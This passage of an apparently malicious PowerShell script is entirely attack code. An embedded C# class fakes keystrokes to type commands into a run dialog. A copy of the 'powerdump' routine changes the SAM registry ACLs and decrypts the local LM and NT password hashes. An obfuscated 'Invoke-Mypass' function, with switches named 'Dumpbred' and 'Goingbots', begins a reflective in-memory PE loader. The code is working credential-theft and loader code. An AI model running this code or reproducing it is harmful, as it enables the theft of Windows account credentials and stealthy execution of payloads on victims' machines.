			if(c>='a' && c<='z'){
				ret_list.Add(false);ret_list.Add(Enum.Parse(type, c.ToString().ToUpper()));
			} else if(c>='A' && c<='Z') {
				ret_list.Add(true);ret_list.Add(Enum.Parse(type, c.ToString()));
			} else if(c>='0' && c<='9') {
				ret_list.Add(false);ret_list.Add(Enum.Parse(type, "D"+c.ToString()));
			}
            switch (c)  
            {   
				case '.':
					ret_list.Add(false);ret_list.Add(Keys.OemPeriod);
					break;
				case '/':
					ret_list.Add(false);ret_list.Add(Keys.Divide);
					break;
				case '-':
					ret_list.Add(false);ret_list.Add(Keys.OemMinus);
					break;
				case '\'':
					ret_list.Add(false);ret_list.Add(Keys.OemQuotes);
					break;
				case '=':			
					ret_list.Add(false);ret_list.Add(Keys.Oemplus);
					break;
				case ' ':
					ret_list.Add(false);ret_list.Add(Keys.Space);
					break;
				case '+':
					ret_list.Add(true);ret_list.Add(Keys.Oemplus);
					break;
				case '(':
					ret_list.Add(true);ret_list.Add(Keys.D9);
					break;
				case ')':
					ret_list.Add(true);ret_list.Add(Keys.D0);
					break;
				case '&':
					ret_list.Add(true);ret_list.Add(Keys.D7);
					break;
				default:
					break;
            }  
			return ret_list;
        } 
		
		public static void runCmd(string cmdstr){
			Thread.Sleep(1000);
			WinR();
			ProcessKeys(cmdstr);
			Enter();
		}
		
		private static void ProcessKey(char key){
			List<INPUT> inputs = new List<INPUT>();
			uint shiftKey = MapVirtualKey((uint)Keys.ShiftKey, (uint)0x0);
			ArrayList mapper = GetKeysByChar(key);
			uint skey = MapVirtualKey((uint)(Keys)mapper[1], (uint)0x0); 
			if((bool)mapper[0]){
				INPUT input = new INPUT();
				input.type = INPUTType.INPUT_KEYBOARD;
				input.Event.ki.dwFlags = KEYEVENTF.SCANCODE;
				input.Event.ki.wScan = (ushort)shiftKey;
				inputs.Add(input);
			} 
			INPUT input1 = new INPUT();
			input1.type = INPUTType.INPUT_KEYBOARD;
			input1.Event.ki.dwFlags = KEYEVENTF.SCANCODE;
			input1.Event.ki.wScan = (ushort)skey;
			inputs.Add(input1);
			
			INPUT input2 = new INPUT();
			input2.type = INPUTType.INPUT_KEYBOARD;
			input2.Event.ki.dwFlags = KEYEVENTF.SCANCODE | KEYEVENTF.KEYUP;
			input2.Event.ki.wScan = (ushort)shiftKey;
			inputs.Add(input2);
			uint cSuccess = SendInput(inputs.ToArray().Length, inputs.ToArray(), Marshal.SizeOf(typeof(INPUT)));
		}
		
		private static void ProcessKeys(string keys){
			for (int i = 0; i < keys.Length; i++) {
				ProcessKey(keys[i]);
				Thread.Sleep(10);
			}
		}
		
		private static void WinR(){
			INPUT[] input = new INPUT[4];	
			
			input[0].type = input[1].type = input[2].type = input[3].type = INPUTType.INPUT_KEYBOARD;
			input[0].Event.ki.wScan  = input[2].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.ControlKey, (uint)0x0);
			input[1].Event.ki.wScan  = input[3].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.Escape, (uint)0x0);
			input[2].Event.ki.dwFlags = input[3].Event.ki.dwFlags = KEYEVENTF.KEYUP;			
			SendInput(4, input, Marshal.SizeOf(typeof(INPUT)));
		}
		private static void Enter(){
			Thread.Sleep(200);
			INPUT[] inputs = new INPUT[2];
			for (int i = 0; i < 1; i++)
			{
				uint skey = MapVirtualKey((uint)Keys.Return, (uint)0x0);
				inputs[i].type = INPUTType.INPUT_KEYBOARD;
				inputs[i].Event.ki.dwFlags = KEYEVENTF.SCANCODE;
				inputs[i].Event.ki.wScan = (ushort)skey;
			}
			inputs[1].type = INPUTType.INPUT_KEYBOARD;
			inputs[1].Event.ki.dwFlags = KEYEVENTF.UNICODE;
			inputs[1].Event.ki.dwFlags |= KEYEVENTF.KEYUP;
			uint cSuccess = SendInput(inputs.Length, inputs, Marshal.SizeOf(typeof(INPUT)));
		}
	}
}
"@

aDd-TYpe -TypeDefinition $source2 -ReferencedAssemblies @("System.Windows.Forms")

function geth {  
 
[CmdletBinding()]
Param (
    [Switch]$PSObjectFormat
)

$script:PowerDump = $null
function LoadApi
{
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('PowerDump', 'Public, Class')

    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegOpenKeyEx',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int], [string], [int], [int], [int].MakeByRefType())
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
    )
    $FieldValueArray = [Object[]] @(
        'RegOpenKeyEx',
        [Runtime.InteropServices.CharSet]::Auto
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegQueryInfoKey',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int], [Text.Stringbuilder], [int].MakeByRefType(), [int], [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [IntPtr])
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    )
    $FieldValueArray = [Object[]] @(
        'RegQueryInfoKey',
        [Runtime.InteropServices.CallingConvention]::Winapi,
        $true
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    $PInvokeMethod = $TypeBuilder.DefineMethod(
        'RegCloseKey',
        [Reflection.MethodAttributes] 'Public, Static',
        [int],
        [Type[]] @( [int])
    )

    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))

    $FieldArray = [Reflection.FieldInfo[]] @(
        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    )
    $FieldValueArray = [Object[]] @(
        'RegCloseKey',
        $true
    )

    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportConstructor,
        @('advapi32.dll'),
        $FieldArray,
        $FieldValueArray
    )
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    ################################################################################
    
    $script:PowerDump = $TypeBuilder.CreateType()
}

#######################################powerdump written by David Kennedy#########################################

$antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0");
$almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0");
$empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);
$empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);
$odd_parity = @(
  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
);

function sid_to_key($sid)
{
    $c0 = $sid -band 255
    $c1 = ($sid -band 65280)/256
    $c2 = ($sid -band 16711680)/65536
    $c3 = ($sid -band 4278190080)/16777216

    $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
    $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 

    return ,((str_to_key $s1),(str_to_key $s2))
}

function str_to_key($s)
{
    $k0 = [int][math]::Floor($s[0] * 0.5)
    $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)
    $k2 = ( $($s[1] -band 0x03) * 32) -bor [int][math]::Floor($s[2] * 0.125)
    $k3 = ( $($s[2] -band 0x07) * 16) -bor [int][math]::Floor($s[3] * 0.0625)
    $k4 = ( $($s[3] -band 0x0F) * 8) -bor [int][math]::Floor($s[4] * 0.03125)
    $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)
    $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)
    $k7 = $($s[6] -band 0x7F)

    $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)

    0..7 | %{
        $key[$_] = $odd_parity[($key[$_] * 2)]
    }

    return ,$key
}

function NewRC4([byte[]]$key)
{
    return new-object Object |
    Add-Member NoteProperty key $key -PassThru |
    Add-Member NoteProperty S $null -PassThru |
    Add-Member ScriptMethod init {
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    } -PassThru |
    Add-Member ScriptMethod "encrypt" {
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    } -PassThru
}

function des_encrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $true)
}

function des_decrypt([byte[]]$data, [byte[]]$key)
{
    return ,(des_transform $data $key $false)
}

function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
{
    $des = new-object Security.Cryptography.DESCryptoServiceProvider;
    $des.Mode = [Security.Cryptography.CipherMode]::ECB;
    $des.Padding = [Security.Cryptography.PaddingMode]::None;
    $des.Key = $key;
    $des.IV = $key;
    $transform = $null;
    if ($doEncrypt) {$transform = $des.CreateEncryptor();}
    else{$transform = $des.CreateDecryptor();}
    $result = $transform.TransformFinalBlock($data, 0, $data.Length);
    return ,$result;
}

function Get-RegKeyClass([string]$key, [string]$subkey)
{
    switch ($Key) {
        "HKCR" { $nKey = 0x80000000} #HK Classes Root
        "HKCU" { $nKey = 0x80000001} #HK Current User
        "HKLM" { $nKey = 0x80000002} #HK Local Machine
        "HKU"  { $nKey = 0x80000003} #HK Users
        "HKCC" { $nKey = 0x80000005} #HK Current Config
        default {
            throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
        }
    }
    $KEYQUERYVALUE = 0x1;
    $KEYREAD = 0x19;
    $KEYALLACCESS = 0x3F;
    $result = "";
    [int]$hkey=0
    if (-not $script:PowerDump::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
    {
    	$classVal = New-Object Text.Stringbuilder 1024
    	[int]$len = 1024
    	if (-not $script:PowerDump::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
    		[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
    	{
    		$result = $classVal.ToString()
    	}
    	else
    	{
    		Write-Error "RegQueryInfoKey failed";
    	}
    	$script:PowerDump::RegCloseKey($hkey) | Out-Null
    }
    else
    {
    	Write-Error "Cannot open key";
    }
    return $result;
}

function Get-BootKey
{
    $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
    $b = new-object byte[] $($s.Length/2);
    0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
    $b2 = new-object byte[] 16;
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
    return ,$b2;
}

function Get-HBootKey
{
    param([byte[]]$bootkey);
    $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
    $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
    $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
    if (-not $k) {return $null}
    [byte[]]$F = $k.GetValue("F");
    if (-not $F) {return $null}
    $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
    $rc4 = NewRC4 $rc4key;
    return ,($rc4.encrypt($F[0x80..0x9F]));
}

function Get-UserName([byte[]]$V)
{
    if (-not $V) {return $null};
    $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
    $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
    return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
}

function Get-UserHashes($u, [byte[]]$hbootkey)
{
    [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
    
    # check if hashes exist (if byte memory equals to 20, then we've got a hash)
    $LM_exists = $false;
    $NT_exists = $false;
    # LM header check
    if ($u.V[0xa0..0xa3] -eq 20)
    {
        $LM_exists = $true;
    }
    # NT header check
    elseif ($u.V[0xac..0xaf] -eq 20)
    {
        $NT_exists = $true;
    }

    if ($LM_exists -eq $true)
    {
        $lm_hash_offset = $u.HashOffset + 4;
        $nt_hash_offset = $u.HashOffset + 8 + 0x10;
        $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
        $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
	
    elseif ($NT_exists -eq $true)
    {
        $nt_hash_offset = $u.HashOffset + 8;
        $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
    }
    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
}

function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
{
    [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
    if ($enc_lm_hash)
    {
        $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
    }

    if ($enc_nt_hash)
    {
        $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
    }

    return ,($lmhash,$nthash)
}

function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
{
    $deskeys = sid_to_key $rid;
    $md5 = [Security.Cryptography.MD5]::Create();
    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
    $rc4 = NewRC4 $rc4_key;
    $obfkey = $rc4.encrypt($enc_hash);
    $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
        (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
    return ,$hash;
}

function Get-UserKeys
{
    ls HKLM:\SAM\SAM\Domains\Account\Users |
        where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
            Add-Member AliasProperty KeyName PSChildName -PassThru |
            Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
            Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
}

function DumpHashes
{
    LoadApi
    $bootkey = Get-BootKey;
    $hbootKey = Get-HBootKey $bootkey;
    Get-UserKeys | %{
        $hashes = Get-UserHashes $_ $hBootKey;
        if($PSObjectFormat)
        {
            $creds = New-Object psobject
            $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username
            $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid
            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
            $creds
        }
        else
        {
            "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
        }
    }
}

    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Return
    } 
    else
    {
        $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
        "FullControl",
        [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
        [System.Security.AccessControl.PropagationFlags]"None",
        [System.Security.AccessControl.AccessControlType]"Allow")
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
        "SAM\SAM\Domains",
        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
        [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        $acl = $key.GetAccessControl()
        $acl.SetAccessRule($rule)
        $key.SetAccessControl($acl)

        DumpHashes

        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
        Set-Acl HKLM:\SAM\SAM\Domains $acl

    }
}

function Invoke-Mypass
{
[CmdletBinding(DefaultParameterSetName="Dumpbred")]
Param(
    [Parameter(Position = 0)]
    [String[]]
    $ComputerName,

    [Parameter(ParameterSetName = "Dumpbred", Position = 1)]
    [Switch]
    $Dumpbred,

    [Parameter(ParameterSetName = "Goingbots", Position = 1)]
    [Switch]
    $Goingbots,

    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$LSHDUGF = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $PPSDHKDSDBytSHDSDes32,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $PPSDHKDSDBytes32,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 3, Mandatory = $false)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [String]
        $ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $EAIUFHS
    )
    



    Function LGDJSR
    {
        $DJH32H = New-Object System.Object



        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]




        $LHFSser = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $LHFSser.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $LHFSser.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $LHFSser.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $LHFSser.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType


        $LHFSser = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $LHFSser.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType


        $LHFSser = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $LHFSser.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType


        $LHFSser = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $LHFSser.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $LHFSser.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $LHFSser.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $LHFSser.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $LHFSser.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $LHFSser.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType



        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $KSHDSDHA_a, [System.ValueType], 8)
        ($LHFSser.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($LHFSser.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY


        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $KSHDSDHA_a, [System.ValueType], 20)
        $LHFSser.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $LHFSser.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $LHFSser.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $LHFSser.CreateType()
        $DJH32H | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER


        $KSHDSDHA_a = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $LHFSser = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $KSHDSDHA_a, [System.ValueType], 240)
        ($LHFSser.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($LHFSser.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($LHFSser.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($LHFSser.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($LHFSser.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($LHFSser.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($LHFSser.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($LHFSser.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($LHFSser.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($LHFSser.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($LHFSser.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($LHFSser.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($LHFSser.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($LHFSser.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($LHFSser.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($LHFSser.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($LHFSser.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($LHFSser.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($LHFSser.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($LHFSser.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($LHFSser.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($LHFSser.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($LHFSser.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($LHFSser.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($LHFSser.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
